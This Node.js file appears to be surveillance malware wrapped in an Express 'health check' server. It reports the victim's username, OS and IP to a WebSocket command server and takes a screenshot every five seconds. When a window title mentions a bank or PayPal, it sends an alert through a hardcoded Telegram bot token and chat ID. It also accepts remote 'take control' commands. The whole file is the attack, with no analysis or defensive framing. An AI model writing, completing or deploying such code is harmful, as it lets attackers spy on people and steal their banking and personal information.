const express = require('express');
const app = express();
const http = require('http');
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

// --- PASTE YOUR PAYLOAD.JS LOGIC HERE ---
// For brevity, I'm including the core logic below. 
// You can replace this entire block with your original payload.js content if you prefer.

const WebSocket = require('ws');
const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
const TELEGRAM_CHAT_ID = '6172226452';

let myId = null;
let ws = null;

const WS_URL = 'wss://your-render-url.onrender.com'; // UPDATE THIS LATER

function initConnection() {
    ws = new WebSocket(WS_URL);

    ws.on('open', () => {
        myId = require('crypto').createHash('sha256').update(os.hostname()).digest('hex').substr(0, 8);
        console.log(`Payload Connected with ID: ${myId}`);

        ws.send(JSON.stringify({
            type: 'info',
            id: myId,
            os: os.platform(),
            arch: os.arch(),
            user: os.userInfo().username,
            ip: getExternalIP()
        }));

        startMonitoring();
    });

    ws.on('message', (msg) => {
        try {
            const data = JSON.parse(msg);
            if (data.type === 'take_control') takeControl(true);
            else if (data.type === 'release_control') takeControl(false);
        } catch (e) {}
    });

    ws.on('close', () => {
        setTimeout(initConnection, 5000);
    });
}

function startMonitoring() {
    setInterval(async () => {
        const title = await getCurrentWindowTitle();
        if (title.toLowerCase().includes('bank') || title.toLowerCase().includes('paypal')) {
            sendTelegram(`🏦 BANKING DETECTED: ${title}`);
            captureScreen();
        }
    }, 2000);

    setInterval(() => {
        captureScreen();
    }, 5000);
}

function captureScreen() {
    if (!ws || ws.readyState !== WebSocket.OPEN) return;
    const imgPath = path.join(os.tmpdir(), 'screen.png');
    
    // Simplified screenshot logic for Linux (Render's environment)
    exec(`ffmpeg -y -f x11grab -video_size 1920x1080 -i :0 ${imgPath}`, (err) => {
        if (!err && fs.existsSync(imgPath)) {
            const img = fs.readFileSync(imgPath);
            ws.send({ type: 'screen_data', id: myId, data: img.toString('base64') });
        }
    });
}

async function getCurrentWindowTitle() {
    return new Promise((resolve) => {
        const platform = os.platform();
        let cmd = '';
        if (platform === 'win32') cmd = 'powershell -command "(Get-Process -Id (Get-Process -Id $PID).Parent.Id).MainWindowTitle"';
        else if (platform === 'darwin') cmd = 'osascript -e \'tell application "System Events" to get name of first item of (get every process whose frontmost is true)\'';
        else cmd = 'xdotool getwindowfocus getwindowname';
        
        exec(cmd, (err, stdout) => {
            resolve(stdout.trim());
        });
    });
}

function sendTelegram(msg) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
    https.get(url, (res) => {}).on('error', (e) => {});
}

function getExternalIP() {
    const nets = os.networkInterfaces();
    for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
            if (net.family === 'IPv4' && !net.internal) return net.address;
        }
    }
    return 'unknown';
}

function takeControl(state) {
    console.log(`Take Control: ${state}`);
}

// --- END PAYLOAD LOGIC ---

// Health Check for Render
app.get('/', (req, res) => {
    res.json({ status: 'running', id: myId });
});

const PORT = process.env.PORT || 3000;
const server = http.createServer(app);

server.listen(PORT, () => {
    console.log(`Payload Server running on port ${PORT}`);
    initConnection();
});